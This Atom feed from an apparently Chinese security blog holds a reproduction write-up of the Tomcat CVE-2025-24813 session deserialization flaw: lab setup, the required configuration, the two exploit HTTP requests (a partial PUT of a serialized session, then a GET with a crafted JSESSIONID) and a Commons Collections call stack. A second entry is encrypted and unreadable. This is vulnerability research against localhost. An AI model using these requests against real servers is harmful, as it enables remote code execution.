<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Jasper_sec</title>
  
  
  <link href="https://jaspersec.top/atom.xml" rel="self"/>
  
  <link href="https://jaspersec.top/"/>
  <updated>2025-03-31T22:09:47.242Z</updated>
  <id>https://jaspersec.top/</id>
  
  <author>
    <name>Jasper_sec</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>Tomcat CVE-2025-24813 复现</title>
    <link href="https://jaspersec.top/posts/2631321160.html"/>
    <id>https://jaspersec.top/posts/2631321160.html</id>
    <published>2025-03-27T09:01:00.000Z</published>
    <updated>2025-03-31T22:09:47.242Z</updated>
    
    <content type="html"><![CDATA[<h2 id="漏洞简介"><a href="#漏洞简介" class="headerlink" title="漏洞简介"></a>漏洞简介</h2><p>最近爆出的 tomcat session 反序列化漏洞，思路比较明确，但是需要开配置，稍微鸡肋。</p><p>PS：这个洞刚出的时候，看到许少发pyq于是看了下，但是因为学校论文和找实习的事拖了俩礼拜没写文章，惨惨（） <del>btw，来个厂子收了我罢</del></p><h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>有两种调试方法，一种是直接搭建源码调试环境，一种是配置 tomcat 后添加 lib 依赖，分别对应下面两个教程：</p><ol><li>郑瀚师傅的源码调试： <a href="https://www.cnblogs.com/LittleHann/p/17735106.html">https://www.cnblogs.com/LittleHann/p/17735106.html</a></li><li>idea 部署 tomcat： <a href="https://blog.csdn.net/qq_74312232/article/details/137474027">https://blog.csdn.net/qq_74312232/article/details/137474027</a></li></ol><p>PS：这里采用法二，第一种方法会有各种问题，包括 build error、缺少 java.lang.xxx 等等，可以解决但是会很麻烦。</p><p>法二的大致思路：部署 tomcat-binary ，idea 添加一个 web framework（artifact），然后运行这个 artifact；至于源码调试，直接把 tomcat-binary 的 lib 里的 jar 包全部 add as library 就好，里面还有些小坑，这里详细说一下。</p><p>首先下载 tomcat-binary-9.0.98： <a href="https://archive.apache.org/dist/tomcat/tomcat-9/v9.0.98/bin/apache-tomcat-9.0.98.zip">https://archive.apache.org/dist/tomcat/tomcat-9/v9.0.98/bin/apache-tomcat-9.0.98.zip</a></p><p>然后 idea new 一个 空 maven 项目，然后选中项目根目录，双击shift 输入 <code>add framework</code><br><img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/fae30492f9879a8e999dd9915b25a66a.png"></p><p>若成功，则会弹出下面的页面，选择 web 框架并添加，这是帮助我们添加一个适配 tomcat 的 web 目录架构。<br><img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/42aae67182364e8b5a5f694182b025c2.png"></p><p>点击 OK 添加后， 目录下会多出一个web目录，web目录下的index.jsp是我们后续会访问的地方。<br><img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/6f88d54120f1268c7259392db86e737e.png"></p><p>注意：还需要将 Web 目录添加到 source root，不然会出现 404 Not Found。<br><img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/37a94ddbc45a15ad9670d6b6b4424d27.png"></p><p>下面配置 tomcat，右上角 add environment，选择添加 tomcat local server，并进行配置，下面的两个路径都是之前下载的 tomcat-binary 的根目录。<br><img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/77e183751c957d2f8e933f4679e9d5de.png"></p><p>注意到右下角有个 Fix，提醒我们添加 artifact，点击 Fix 自动跳转的 Deployment Tab，这里的 Application context 可改可不改，我这里保持原样。<br><img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/3f2af23a0ac6e5e39ae06404e20b7164.png"></p><p>至此 tomcat 就配置完毕了，点击运行应该会去访问创建的index.jsp，出现一个 END 字样。<br><img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/2f779c72684475378787918eb84173b3.png"></p><p><img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/98ca94247dc9e77cbdd13c24c4b9cdff.png"></p><p>然后为了能够 debug，需要添加 tomat lib 到 idea 里，把 tomcat-binary 目录下的 lib 复制一份到项目根目录，然后右键 add as library 即可。注意：要利用漏洞的话，还需加一个漏洞依赖，例如 CC3.2.1。<br><img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/2564016aa0d9ec62e04f225b9989453b.png"></p><p>打断点<code>org.apache.catalina.servlets.DefaultServlet#doGet</code>，访问<code>http://localhost:8080/CVE_2025_24813_war_exploded/123</code>，成功断下，可调式环境搭建完成。<br><img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/5cf6dc82762687137961c82d98babf16.png"></p><p>接下来是开启漏洞所需的配置项，不开配置无法上传 session，所以有点鸡肋。</p><p>web.xml</p><figure class="highlight xml"><figcaption><span>title:"web.xml"</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">init-param</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">param-name</span>&gt;</span>readonly<span class="tag">&lt;/<span class="name">param-name</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">param-value</span>&gt;</span>false<span class="tag">&lt;/<span class="name">param-value</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">init-param</span>&gt;</span></span><br></pre></td></tr></table></figure><p>context.xml</p><figure class="highlight xml"><figcaption><span>title:"context.xml"</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">Manager</span> <span class="attr">className</span>=<span class="string">&quot;org.apache.catalina.session.PersistentManager&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">Store</span> <span class="attr">className</span>=<span class="string">&quot;org.apache.catalina.session.FileStore&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">Manager</span>&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/d6c81e3ea0e677d49ae5494e3d3a8feb.png"></p><h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>漏洞本质：利用 PUT 协议上传恶意 Session 到服务器，由于服务器读取 Session 是反序列化读取，导致反序列化漏洞。</p><h3 id="影响范围"><a href="#影响范围" class="headerlink" title="影响范围"></a>影响范围</h3><ul><li>9.0.0.M1 &lt;&#x3D; tomcat &lt;&#x3D; 9.0.98</li><li>10.1.0-M1 &lt;&#x3D; tomcat &lt;&#x3D; 10.1.34</li><li>11.0.0-M1 &lt;&#x3D; tomcat &lt;&#x3D; 11.0.2</li></ul><h3 id="Exp"><a href="#Exp" class="headerlink" title="Exp"></a>Exp</h3><p>step1：上传恶意 session 到服务器</p><figure class="highlight http"><figcaption><span>title:"Step1"</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">PUT /CVE_2025_24813_war_exploded/Jasper_sec/session HTTP/1.1  </span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>localhost:8080</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>1000  </span><br><span class="line"><span class="attribute">Content-Range</span><span class="punctuation">: </span>bytes 0-1000/1200  </span><br><span class="line"></span><br><span class="line">此处是java序列化payload，</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/7d4f143675d7aec19f8825c7b5d6b283.png"><br>step2：触发 session 反序列化</p><figure class="highlight http"><figcaption><span>title:"Step2"</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">GET /CVE_2025_24813_war_exploded/ HTTP/1.1  </span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>localhost:8080  </span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>JSESSIONID=.Jasper_sec</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/ab00435962519c5d07200fd3fcfed3d4.png"></p><h3 id="漏洞调试"><a href="#漏洞调试" class="headerlink" title="漏洞调试"></a>漏洞调试</h3><p>首先是 Session文件的上传，路由处理在 <code>org.apache.catalina.servlets.DefaultServlet#doPut</code>，开头就能看到，如果 <code>readonly=true</code> 的话，会直接 send not allowed，所以需要通过配置文件设置 <code>readonly=false</code>。<br><img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/f0fa97923d4f4b5f1346685265688308.png"></p><p>然后如果请求里有 <code>Content-Range</code>，并且符合一定规则，就可以进到 else 逻辑，触发<code>DefaultServlet#executePartialPut</code><br><img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/84dc5c7f4270d34b0968b288122d4f34.png"></p><p><code>org.apache.catalina.servlets.DefaultServlet#executePartialPut</code> 会把文件上传的 tomcat 设置的 tmp 目录里，文件名是把路由的 <code>&quot;/&quot;</code>  替换成 <code>&quot;.&quot;</code>，所以  <code>/Jasper_sec/session</code> 变成了 <code>.Jasper_sec.session</code>，实现了 Session  文件的上传。<br><img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/ce1dd1e3efd71a6ab7176f30204a0bbe.png"></p><p>然后是触发 Session 反序列化，这个也很简单，就是读取 Cookie 的 JSESSIONID 然后做拼接，可以看这个 load 函数，逻辑会很清晰：<code>org.apache.catalina.session.FileStore#load</code>，包括拼接文件名，然后执行对文件内容反序列化。<br><img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/8a7c7477437120777634195a67dc124c.png"><br>函数调用栈</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">transform:120, InvokerTransformer (org.apache.commons.collections.functors)</span><br><span class="line">get:158, LazyMap (org.apache.commons.collections.map)</span><br><span class="line">getValue:74, TiedMapEntry (org.apache.commons.collections.keyvalue)</span><br><span class="line">hashCode:121, TiedMapEntry (org.apache.commons.collections.keyvalue)</span><br><span class="line">hash:338, HashMap (java.util)</span><br><span class="line">readObject:1397, HashMap (java.util)</span><br><span class="line">invoke0:-1, NativeMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:62, NativeMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:43, DelegatingMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:497, Method (java.lang.reflect)</span><br><span class="line">invokeReadObject:1058, ObjectStreamClass (java.io)</span><br><span class="line">readSerialData:1900, ObjectInputStream (java.io)</span><br><span class="line">readOrdinaryObject:1801, ObjectInputStream (java.io)</span><br><span class="line">readObject0:1351, ObjectInputStream (java.io)</span><br><span class="line">readObject:371, ObjectInputStream (java.io)</span><br><span class="line">doReadObject:1199, StandardSession (org.apache.catalina.session)</span><br><span class="line">readObjectData:846, StandardSession (org.apache.catalina.session)</span><br><span class="line">load:203, FileStore (org.apache.catalina.session)</span><br><span class="line">loadSessionFromStore:723, PersistentManagerBase (org.apache.catalina.session)</span><br><span class="line">swapIn:672, PersistentManagerBase (org.apache.catalina.session)</span><br><span class="line">findSession:467, PersistentManagerBase (org.apache.catalina.session)</span><br><span class="line">doGetSession:2723, Request (org.apache.catalina.connector)</span><br><span class="line">getSessionInternal:2468, Request (org.apache.catalina.connector)</span><br><span class="line">invoke:452, AuthenticatorBase (org.apache.catalina.authenticator)</span><br><span class="line">invoke:130, StandardHostValve (org.apache.catalina.core)</span><br><span class="line">invoke:93, ErrorReportValve (org.apache.catalina.valves)</span><br><span class="line">invoke:660, AbstractAccessLogValve (org.apache.catalina.valves)</span><br><span class="line">invoke:74, StandardEngineValve (org.apache.catalina.core)</span><br><span class="line">service:346, CoyoteAdapter (org.apache.catalina.connector)</span><br><span class="line">service:396, Http11Processor (org.apache.coyote.http11)</span><br><span class="line">process:63, AbstractProcessorLight (org.apache.coyote)</span><br><span class="line">process:937, AbstractProtocol$ConnectionHandler (org.apache.coyote)</span><br><span class="line">doRun:1791, NioEndpoint$SocketProcessor (org.apache.tomcat.util.net)</span><br><span class="line">run:52, SocketProcessorBase (org.apache.tomcat.util.net)</span><br><span class="line">runWorker:1190, ThreadPoolExecutor (org.apache.tomcat.util.threads)</span><br><span class="line">run:659, ThreadPoolExecutor$Worker (org.apache.tomcat.util.threads)</span><br><span class="line">run:63, TaskThread$WrappingRunnable (org.apache.tomcat.util.threads)</span><br><span class="line">run:745, Thread (java.lang)</span><br></pre></td></tr></table></figure><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><ul><li><a href="https://forum.butian.net/article/674">https://forum.butian.net/article/674</a></li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;漏洞简介&quot;&gt;&lt;a href=&quot;#漏洞简介&quot; class=&quot;headerlink&quot; title=&quot;漏洞简介&quot;&gt;&lt;/a&gt;漏洞简介&lt;/h2&gt;&lt;p&gt;最近爆出的 tomcat session 反序列化漏洞，思路比较明确，但是需要开配置，稍微鸡肋。&lt;/p&gt;
&lt;p&gt;PS：这个洞</summary>
      
    
    
    
    
    <category term="Java" scheme="https://jaspersec.top/tags/Java/"/>
    
    <category term="反序列化" scheme="https://jaspersec.top/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    
    <category term="漏洞复现" scheme="https://jaspersec.top/tags/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    
  </entry>
  
  <entry>
    <title>CodeQL 进阶</title>
    <link href="https://jaspersec.top/posts/1777878032.html"/>
    <id>https://jaspersec.top/posts/1777878032.html</id>
    <published>2025-03-22T10:20:00.000Z</published>
    <updated>2025-03-31T22:09:47.241Z</updated>
    
    <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Wrong password." data-whm="Sorry, this article cannot be verified, but you can still see the decrypted content.">  <script id="hbeData" type="hbeData" data-hmacdigest="cfa299d70fbd03ac731933af8feae32713eae5ecf2239ae0ee48829f70d743e7">4469116f94252ed412ad80bbe4339d9d79f581276b72b92a36549afaca2745d58fe6c8a9a7e3258edf0f4eba99150c2b7fad547207a66e6c255bf07c0ed5b08cd8a99947e4ead454017a65e6382ded2444adc374dc7d14a0d897e4689fc77c5372dcb28f922275aaa7f7b42e2b284121f66aad2e89779b3c9450d51f6a2a3d2c3e7501e63f7f09a44d913ec2f542641fee7b76fdad3b5eadc166d29e3849832f964883118219340e1fcad94491b457bd7833f52f2135089809127f28361e3d76d46b2820ffc48bf13229c2c69403788ea4f5f3270e38f986827ca204fac905b625d679e14f70997079b9cc47ca5963309489eed1c993ae189adba59bbf9c7c2c9a7c2fc1d2ecf4240eefcead533e9ba00031261f5a0ca088b654d785476ff0e9ced65e1e49bea8f1d7646d6b51cc5923527d7d0a429aa43e39390eb6b4a1af297d9c624cf91eaeaa9f9d07bbfad9333a6dd8ce063d56d41116716ccd0de3c91d4663e1bf4a747a4a0521440d7cb8691476ae0e48860aba2a1dddd48064a819c23302d2b4c2950a0ec0277d3986b330ed623d86d943a29a6d7caec5a3ae9a84a87c2075d03885299c072016bca4fc8caa00a4332f72a2d783f7226cf5c7ae44a045387c3f5daf96783520835f30a20773cb7296cf6c7c703a483298b4762e9a70fd20d3d2442ae8ec711b94441da484da4410a27bb73d5ce6eaea5287bb00515e5341f7c656a5b865c944a4ac4186b9576871d0bba95fe538f928655819badb5f7ff1453322ee8fb80debe509f47e0257df65f5d604297b8d911e2e32bf06bcde0ac110c7f3983e6de5a51cd88914e041db4b31e8c86f8771dfe477d1c0a1d081c083bcae0d3e2d1751b9073ccf162e451aa5290e094341eadf1e75d9be522cb5168989f3baea159f6dcb4eac091658ff74f03d0042d9411b46bd0065582d91a6066e28702400d3e02c5a24b3dbef4786fbda56745fecf28b0f87dd3d8ba2fd847311cfbba558fb5c3915f6c9d739e1d456250911bb7758a17bee86c9984844c31c65fbc85e55f97bbfea08c0470981d822d0345173430b72c364b787d056d0ba0906751ec914e428e2ebe24f5ab0b807f2d0e2f48ee9b3afefedae2cf6070cf54e2d347c9500c7060fd4d757758f64b31a24b193e3de0864eac8b921b60164ebf0c378feae4f884450f2c9801dc0ccfe6c31e2020d07255b85c22faa754ed13d7bf477216e0c1c950b4b471d7f155a6de477a7384935ebefd5458e7772f40215e72683f2e57ec4f3f19d239b58a5feb013439899cd07a7c94e8b32fb84ffbdfa6ba4ed63a60696a1d44e91f037c0bbf1494929008fcdccae841afaef8cff330597e99a19901d2da3846d17d93095b762657f2a5e36e3e6aba569811c490a46bf87229a123b02039a5c76eb8df34c02efae67093ebd8edd3844c739247e1ec5909ca84f9c473795c0f8150aeafbe9d7ef39a4179f2211f6d1ed874a6e153dacc4529fb9e2c94b2ba506516b416eb207dbd07fee1b817f9ab545e3313a506b6f6e88c7570e5468e584c8bf97da53cb2661373e5646d6910c2808ea9357e1210189c008925ebc79fa31fa0587bc76144238038f62198f5f3e21026de36d78cf39126beec6d26a5497f0c69f578c627428879474ebbb7d5b0f1b87732d7afd0821459dd124fcce7b5cacba15ea47c18aad00caf1f542888474af103c5887c1ea8b4e72553c1aeed75b9bcc9bd1a571b1537d9f189ca8974bf6adb051fa6351718789f8a06593f0e0fddb75383e2b890e1663abb0ebdbcab126cc643fce8f455b7b37267b4ac68dc0171a3f2977cad525dbe13b2195962d4ccfb5bba56c9451ecf539431f952db35935f3d68e9287feec9de7da0799b27cc6cb13141f81a3f07d39ec2c66e3bb85a8c91f8fac87bea8fac0fffe90fa25fd8a327f5d31856e21f560c35a63786341a3d373ef21616579f3427e44c7d525c6a8c23a9af7de2dc5808e59aaccedad4dade3dbf8fb90c963082ca36acc418bc7922d4abc72436655f4c8f4f03434645f1e299b6de5a7dc87e32e2ce1c3a4b8000f4ad1470e25134df28259c351d97e88c3657d15372f70cc6b1218c04b9c6c23e7597f7ea3b3121b3623aa156003a9ea36503ea75af199b2a21faa9a4ee631b1fafc9af9303f86ca24c77b1ffa03600015ac5c7642016f658ffa39d7be489f700a76aa052d40fa3641684bc77dab14e6768ebbf33d48b04329472f697b13b7d0f137581b4128ef0112d12b5f7426980ee9ca360ca27c577955566a7fea8ec4f5846fbc233108cd30baba170bc62739dd76cc9504c7b0d39cdcca30cc38083ff4e676820ceef5f4a88bf5f334de8124b571f1f8bffe24ab5e83fa275a566cbae9a60b6a6738436139b61d736be7f8dd60b08ff0681ccaf155ace9496ac953ce523d9044e41838c49ecb52c3910a8dec2ae4640f24884f306c1d5f8af0622b06e1882371fc26420f6b9b06002f0fd665617a8319a5f175e61037a29b0b970b5643f23c8d8a9ec3acc9ce9956f4da91d62822cf48e9a1c43165adfc93b018d882c4b152643b12137a3d1ed0d76e7d7e52ac5fca16d4163445ef29adb0cfce050d7bff76fcd5b270c4fce3f581498dd74bf6612c87bd2ce4cd6b5af03ba0715211f229f6924ca5e310f48d152ed5d3a39507f690b385a2495b27c8f0ca03fa53823ba4f2423b044e03343e979448d8929fde941187cb8fa5efebd472fe0e7e1d8261fd2eb4074889035bb80162a4500ed409449150d3570bdb05c390c65793d930c1c04efae1880b8d0a277a83391b63c588832aedf8e13ec99b6081aa51ce2567092e23b699095a124956294f6550c2be51dae718e9845800cb2a8236b5669a14358c09251a46018bfe0d432bc6dd42667448666632f3177355185ee3ad110a41a9142a0b353d01967411f07112a4e530613c1cbc0e67c05a3f0ede3cb7d11b966d4ec4b78bd5cd827fa47bcd06256077cbb8b8966e1d7141e1aa97d589386dd96538418feeee38d6c23f85d77cbd63ddb58bc25833313de3f9207f6da8aae285ec2bad55088b1c8bd1cc923d864dcac0bffe839c0651999a6b8dfcacccf19f07f3d2779c7dfdd67d965a5afc50fc61abeda693f11b41bd5929a109327b78bb9aaa64a5269e8262cdeef8748f62bdd9c8710e450a48c161a8af8e33d594a67806d8990bfa40d691ddc14414570088bb0c2e0912c92be5578ac8fdff8a082ae2553566d8c081f189dad0b856bd1144a299f1420d17a5b6c05ea09edfd8540c7435f659c7e4c084600c6984c5d5db69468fa93ea4e413c3d99e80485ac016fa8044e332e8d10c823acaf8b889e7eadfd2e1fb531d24e12a15f1823d8e9ba601924dd3c77e5015a78f03bfacfc3d134d0be39aa65434b62b5d2084ef69a5422b41eeb88e04476d0b0c46287663d378ae2c5e95c48d0a3112952e626f36434013ef89b2e50f9c348d1c2be0a99f8f404d27f14659111f8ddf26472e81a426db8baf6ed8bb8c2788907474615e27ec1ebceafd4f10b2c57ac02f33a9f230575c49f91c9286486ef4696a4ae6233094c68d7c873c048593da3f5d331138c5ed4b7620160151b0ba6fed591b3cdf194a28138e87cad7507324001ad0fa5088ee6535c46f81a2a41980d3863edfeb637876157db6431519e0250f1c9fb87534acae77fca341df9d54b651f942cb0e3d09301d4896dbacdcb74db13ef54b9a166137132ac39df6fad9692d34b4405bd27ef55fd7dd9a2b6d22d93066b74f6358d8fe64434a7010b45273631c4fd19d47fe05901d420a374ea7ba70fc820c8b55d1f9570ebab4f65e17607eca524aeac19fd0c1bb99add106ede4678b883d69e83c3a6dc00c2660cc2de5162b95cee61bf18224bbe0ab6ed57b8d6c7d4038eb14c887328fe3c23178b0592947eb5f70b33a3259b98c8bfdd37bb46993dd8c10d027e33a676b7d13e047366034894b700d4fe7adb2c527b88fb1410532733b78cba60e737c1de449cf2f780c60ed67e16f95e237ccc60787337d579bc439307b137005067c3ae02c94bcd19963eb3e00bd200cf4ad084bf9e764263ba1c0c64c8b121aeb964ed4507da1df3865459a6cfee9516f2fb29aebe60ef0a2dac794cf783fdd18bb79337ab9d015a651234bb42bc06864a4a53ec228bccf0ed173b83ca4e355b8f1ee41951c06b0d6bde53a5be405afbd740f5d49805fe1024662b32f80d6845ca18f9a5027080af507eb9e7dc62950dec9d0ebabbaa5d11f2e916a27214b837a3485f79cb3693906014489d81df7567fda9ac00ce264b2cb98dbe769dc648de30b49c1b4f44d8fb9e9612e4db10c12ab87b94b97ca1502819c9f839de26ef83474cc378b87873414fc246d6b068ded21d5fed5bf8cb8f5dc9cfb9b79c993ed7bacf83ef7a92ab77bb5d49ec162cf971dbd88e16e8d7501bd8453a088523120663021163367f643a1ff5a8f5a1fb2b7781314104430d8fdcd0ee7481c84e5b2c69b6ab9aef44f0eec4eb600ce6d88b5f770ec32b72bce19926d2a48cc885bfcb515780029171459ea9f5b18b52d3f8049e365b733ef9702541d224615d8af25b9800a68a06afdbc3f33a510f7b2559cf81805b391c2878757407560abbf53f29e324f158ae747a03476033151c18b16c4c228ee34db8d1a4797723107f4fa47d5508d960c8e80d88c8b48b2ba3d8e7fb17762fe5fdfdec2d2d61b4a75c2bd4307b99e59fa7533dd73209072d2330aaeb50a14e336170d6313fa31e9e4f2994ccaaa9aa4f622a0c7d59c90ce1b6c8fc28f3620ab1088c4ef80c4276d52b474557083077a44ac546860f72132d429297c479d635ef5c9b4b524403ea78969b6dda67c08412655e280be3d72fdbffeeed00397214010601727a7e650db8b6158a2b60b8a143531ba8940f257d335a260f6e8f49dd2edb50f369799e169676bd90068dce9480e9903b72d6e4e5a557c2a08bdeda8df83e6d545e221ff27d737b376d9e7e8cff790b77ac28925b0caf5c53f5ff7b501fcddbcbb7b76ee7cdfef92d88ea5c5ee78111371d700c079eb7fbd13b96c079d8ed907c5173145449e8d4398565e03a9b86d9abdda4a076933cb3f41d7d166ecedb242819a9f4d1b57a5e4a98b27bb37f823d9102e94bfbea48680e5594ba93c4d5eeac7bfa529615603ad81b8cc068427a0d34a287e643cb1fa28700b665c305051cc6193ab439f6e7e17866cc42b82dfcdde833d470d61f62b224a3758ebd2d725ee002e5b8727bc8b029361f0e55ecda018172f5709aaee3c25d6c42e9a413346f561d88c7912b6de22fb53e354a75fccace40274fd52210353522bf4d5a91bb580b62aca8d7914831c93407cab196a5cd96c426b9cf60bb41c32fcf1e3e050f2792cb58d20d6ae972959204a603b63d2f5c67edcdc35a541a3917727fcfef8955aa80072be90877bc5ec5a3deee3bfbeecfd6ca9766ea989455ffe6d0680e068069f2a057f55838645e4471979bb1d782f3f9ced47b2c456d8905b5b22580f3b54ec9c0d990642f9adb06273a6038dd2f8ef8d211d576801f30f14fbf014e8d08708aa88ab600c1b6f5876c68e75f6250f1210d8f53133ca5ba140934a5a7fe98474396c3fa293c7a55e14d99d1799b42012f20b07f15069ad83540314a120a54b57e3f9f6199fae73444c28a40ab90ef6f202f2261dbfee1b78848a6ffaaba72536f90f8fb5de7403c8d02e043cd86fec7f0857588b31fea527fcf678b43c38d1e3010f25bfebf3fa28d7013caa1f68dd1bf8bfa173fcc1cdc6fb141a07af3cc01814cfbfd47e84c0108ac9b1340a770e9a94cf1674fb43089402c744de3354120d61ea631f9d056d15b73c07e1dbf6032a6adab7bddee31c8d6d6578873a290e8ce0fdcd5974bf70f27b36b6947cc525f6c9a431bdbc7430c5249e86673a688fc442f2338557dbe7f3109f3e9444a009a818dde1c985b3d095a9e2d2a622bf52e4bb59f40d9483a0d2c4eb62d566d467b61ecaae089024631026a8664cabc5ae437d1f36992293b6839c26b0a54af80fbca65621f240e1ef0d430f8ec6a0f82aaa8f1c96004dba948ae34fc549ba49a67ded137412f217e0df8c9b155018d5012385a7e9af1c6d956f73f0745e5cf8c0fd289b09d68e75bbd90e4bf1de5e9de884cacaf28733c048ee90595324041fcba1d9688f1938873a9265196ae6f2f36360e8a33ade645b7d85438427f3830897b335c3469e4fdf85c2a04a8cee52cce62b2ce01f420f379ce66e80b45efb59758bacf5fc9646e8c02eff180608196d85fbf2fdb95a62c25e7590035426006c7cd7edc3bb90d7abc577553a4f041b7f02c345d810a24a550d14dd4eac3295944dba6dc87a1c4c86bf75cc47f40d82e868d918c4eba9de635a7cfa3235d86c247d34bcf4c4a5b717b5decc3577deaa14cf3744ff4488be9c6a5e9c92a5bd3f9f6c51bf27f081e37196d16e2622878f663d1e91093f8cc770d880778b5694eeaaab72bedf4b19f0145cbaa85033d869c8d08373fecd0b9baf3d3644171fbd1ca526c188a74b80cb4ab9d672b45d7f7a98fce618b5f0cf24adea513196983332abe5025d25bcd91ee2d33d2aabb081f454711607a8d0c95f92a1e44cea4422f09e2e49c109a79648c04c641df1623f80d91e48d2ab2673347eed6881dd8557945d9935768f81ebaba5f50ec4cc4e7d8808accf5faf9149593d90cd52f6b0c13cb7f1cc8fe364eca881946b044bb93be0de6b5e96da888ad4ab38190795d99e0415ac601bbf4bd553c42a7888f3c350294522d1b734165d9ec64df54c8f670383fd06b7fa877be59f0a0938615c17ca384f8ce00f2c34787fdabdef499b84a93e87c79fe43a6849fa53b8cd8891e28a712e7540bd66366c284c2bd6e867dccf616b1f63367e0d45a1faaa5879faafcdec48983d1830d0e2a0c22b6fed193854dc6169e0286e69cd5a7e6ab592203734b6fd6c4cd60310c43a3837ae1e1adcb3db23da412c6e234c698098b8b1afb6d56624e38be160e65b05a1447a3649516b8e28ca3178d48cd86c1f16e76aa76fae459c3e2229c7872120ad578e7e45b254f1360193789418e50767216c3dfc6130c3e8a9ed27e0f84f0704e5c75acbf82e0f39b92e4de3445fb1f33bddf259c738c6744d90211594fb6ea4904089b72ba7a2154d44173a7c410c2f00beb47a8f5eb90db8e5cafbb3771f49026ab2bb459942410a35221f51e4adb33f741a18cfb5f6e27378048096bb99e6ed92c00020a834c9c4fb3f58ddd499e173e893a2662a06eba7fc10bd43db240f5a91329455e8b779acebfa01ba8c6c941ced51115fdd760e438cd86d4ccf3b9680d1abee56a2c4587aab7f2840363df278ee80708f50f52310760e365a4e0589e9c9c8112bd4557a329c21d9190f734cd3be8d55badfc7c7ef9268ccaa67ec17258f3b02defef0b5f617c09bb20ee4b8bec86990787d31e5f2201c5301e335779d3d7ce9838262af59dabfce4c92b936cebe75e234d9bff63f27f16da248200b239284b5ba7d3a875794147ad7c1bd4cefa82f3b57c391978a63e63eb5581abf84a9c6503b9868fdea0f23760abb86803cac6c596af0787e74d53079c147c22e8e81b739e75af89bb9d2aeae091b86e23add637c9d71d7d95050a2696cae2f0e679d8b7110054ddf913e03a3e50bb9e90fe555bcbfaaf53722eab0161c5097786099251d5fe502bea6eb1e028844d463ded8f5a478b7cd0caa70a84d0b2a38a43047bb9c97cbb305ea9fede59316590bc5bf6af8dd9d5e0124d7b1d29d08ea02061ce832827176c98bf32ac322e539da0f0125a00bc07a61c398c198304f23d86c643a40f21c295aacf370e88564c20227b12b53c4bbdf05aab4f3a4024e7eb61dc4d65c41d5f01c882feb31d580b226da71d1effcb61136134e7bdc4907179e45bd928ca3f4db819b10429154eafe319de11bccd29a086c5026b830180110c1411f10b1332ad906b92eecba9447e314e1060b9b5c56ecace9a09c2afbc7f409ea9338472911e8c0d5d5353e6e8693d1acece19410386e0fb6d1e3e640a9b698ee